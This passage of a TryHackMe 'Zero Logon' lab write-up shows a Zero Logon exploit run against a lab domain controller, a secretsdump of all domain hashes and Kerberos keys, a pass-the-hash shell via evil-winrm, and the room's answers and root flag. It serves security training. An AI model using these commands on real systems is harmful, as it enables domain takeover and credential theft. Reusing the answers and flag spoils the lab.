plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> ComputerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_AUTHENTICATOR Authenticator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_AUTHENTICATOR ReturnAuthenticator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNL_TRUST_PASSWORD ClearNewPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>PrimaryName,AccountName,SecureChannelType,ComputerName,Authenticator,ReturnAuthenticator,ClearNewPassword</code></p><ol start="3"><li>What Opnumber is the Method?</li></ol><p><code>30</code></p><ol start="4"><li>Modify the PoC</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-4-lab-it-up">Task 4 Lab It Up!<a href="#task-4-lab-it-up" class="hash-link" aria-label="Direct link to Task 4 Lab It Up!" title="Direct link to Task 4 Lab It Up!">​</a></h2><p><strong>Lab It Up</strong></p><p><strong>Time to Play -</strong></p><p>Now that you&#x27;ve learned about Zero Logon, it&#x27;s time to put your new found skills to the test and exploit this vulnerable Domain Controller!</p><p><strong>Ctrl+Z -</strong></p><p>After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it&#x27;s original state:</p><div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">powershell.exe -c &#x27;Reset-ComputerMachinePassword&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If you&#x27;re confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution. You can do so with the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">evil-winrm -u Administrator -H &lt;Local Admin Hash&gt; -i &lt;Machine IP&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ nmap -sV -sC 10.10.162.183</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 15:22 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.162.183</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.040s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 987 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp   open  domain?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNSVersionBindReqTCP:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    bind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Potentially risky methods: TRACE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-IIS/10.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Holo.Live</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-30 14:22:17Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp  open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp  open  microsoft-ds?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp  open  kpasswd5?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp  open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| rdp-ntlm-info:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Target_Name: HOLOLIVE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Domain_Name: HOLOLIVE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Computer_Name: DC01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Domain_Name: hololive.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Computer_Name: DC01.hololive.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Product_Version: 10.0.17763</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  System_Time: 2020-10-30T14:24:34+00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC01.hololive.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-09-19T17:58:40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2021-03-21T17:58:40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: 2020-10-30T14:24:49+00:00; +1s from scanner time.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port53-TCP:V=7.80%I=7%D=10/30%Time=5F9C219D%P=x86_64-pc-linux-gnu%r(DNS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x04bind\0\0\x10\0\x03&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2020-10-30T14:24:37</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 282.92 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>What is the NetBIOS name of the Domain Controller?</li></ol><p><code>DC01</code></p><ol start="2"><li>What is the NetBIOS domain name of the network?</li></ol><p><code>HOLOLIVE</code></p><ol start="3"><li>What domain are you attacking?</li></ol><p><code>hololive.local</code></p><ol start="4"><li>What is the Local Administrator&#x27;s NTLM hash?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 zeroLogon-NullPass.py DC01 10.10.162.183</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> _____                   __</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">\// / / _ \ &#x27;__/ _ \   / /  / _ \ / _` |/ _ \| &#x27;_ \</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                  |___/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                Vulnerability Discovered by Tom Tervoort</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                              Exploit by Ronnie Bartwitz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Performing authentication attempts...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Failure to Autheticate at attempt number: 148</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Zero Logon successfully exploited, changing password.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ ./impacketEnv/bin/secretsdump.py -just-dc -no-pass DC01\$@10.10.162.183</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Kerberos keys grabbed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:des-cbc-md5:bf34685d383e6734</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt:des-cbc-md5:25f1cea1542f9e31</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\koronei:des-cbc-md5:a737e6073d15aecd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\okayun:des-cbc-md5:10896d3786b9628f</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\watamet:des-cbc-md5:bf622564a840f192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DC01$:des-cbc-md5:cd161923ab9ec11c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Cleaning up...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>3f3ef89114fb063e3d7fc23c20f65568</code></p><ol start="5"><li>How many Domain Admin accounts are there?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">a-koronei</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">a-fubukis</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>2</code></p><ol start="6"><li>What is the root flag?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.162.183</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Evil-WinRM shell v2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hololive\administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Directory: C:\Users\Administrator\Desktop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----        9/20/2020   2:02 PM             24 root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{Zer0Log0nD4rkTh1rty}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>THM{Zer0Log0nD4rkTh1rty}</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/Year of the Rabbit/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Year of the Rabbit</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents 